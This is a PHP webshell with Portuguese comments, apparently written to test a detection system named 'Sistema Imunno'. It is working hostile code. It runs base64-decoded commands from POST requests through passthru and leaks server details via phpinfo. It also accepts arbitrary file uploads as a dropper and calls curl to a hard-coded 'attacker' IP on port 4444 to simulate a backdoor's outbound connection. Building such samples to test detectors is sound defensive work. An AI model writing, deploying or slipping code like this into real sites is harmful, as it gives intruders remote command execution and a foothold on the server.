<?php
// Webshell multifuncional para teste final do Sistema Imunno
// Este script combina várias técnicas suspeitas.

@error_reporting(0);
@set_time_limit(0);

// 1. Coleta de Informações
if (isset($_GET['info'])) {
    phpinfo();
    exit;
}

// 2. Execução de Comando Remoto (Ofuscado)
if (isset($_POST['cmd'])) {
    $command = base64_decode($_POST['cmd']);
    echo "<pre>";
    // A função passthru é tão perigosa quanto shell_exec
    passthru($command);
    echo "</pre>";
    exit;
}

// 3. File Uploader (Dropper)
if (!empty($_FILES['uploaded_file'])) {
    $path = "uploads/";
    if (!is_dir($path)) {
        mkdir($path);
    }
    $path = $path . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
        echo "O arquivo " .  basename($_FILES['uploaded_file']['name']) . " foi enviado.";
    } else {
        echo "Houve um erro ao enviar o arquivo.";
    }
    exit;
}

// 4. Conexão Reversa (Simulada) - O que vai gerar nosso evento de processo
function reverse_connect() {
    $ip = '123.123.123.123'; // IP do atacante
    $port = 4444;
    // Tenta abrir uma conexão de rede para fora, um comportamento clássico de backdoor
    shell_exec("/usr/bin/curl http://" . $ip . ":" . $port);
}

// Apenas para garantir que todas as palavras-chave sejam detectadas
gzuncompress(base64_decode('...'));
include_once('config.php');

echo "Webshell interface.";
reverse_connect();

?>